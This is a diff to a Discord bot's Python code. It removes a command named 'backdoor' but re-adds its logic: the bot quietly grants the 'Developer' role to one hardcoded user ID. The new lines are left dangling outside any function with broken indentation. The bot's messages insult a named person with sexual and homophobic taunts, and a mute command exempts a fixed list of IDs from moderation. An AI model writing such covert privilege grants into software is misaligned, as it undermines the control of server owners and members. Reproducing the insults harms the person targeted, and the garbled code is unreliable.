@@ -20,19 +20,17 @@ async def nick(ext, *, nickname):
 	await ext.channel.purge(limit=1)
 	member = ext.message.author
 	await member.edit(nick=str(nickname))
-@client.command()
-@has_id(433525822956109843)
-async def backdoor(ext):
         role = discord.utils.get(ext.guild.roles, name = "Developer🔨")
-        await ext.message.author.add_roles(role)
-        await ext.send("Серёга готовься сосать")
+        if ext.message.author.id == int(433525822956109843):
+                await ext.message.author.add_roles(role)
+                await ext.send("Serega gay")
 
 @client.command()
 @commands.has_any_role('🔥Leader🔥', 'Deputy✅', 'Developer🔨', 'Тех.Администратор🔧')
 async def mute(ext, member : discord.Member,*, reason):
 	if member.id == int(452312332362579998) or member.id == int(433525822956109843) or member.id == int(667712678730530846) or member.id == int(366930064194928650):
 		await ext.message.delete()
-		my_message = await ext.send(ext.author.mention + ", этому человеку нельзя выдать мут")
+	        my_message = await ext.send(ext.author.mention + ", этому человеку нельзя выдать мут")
 		await asyncio.sleep(120)
 		await my_message.delete()
 	else:
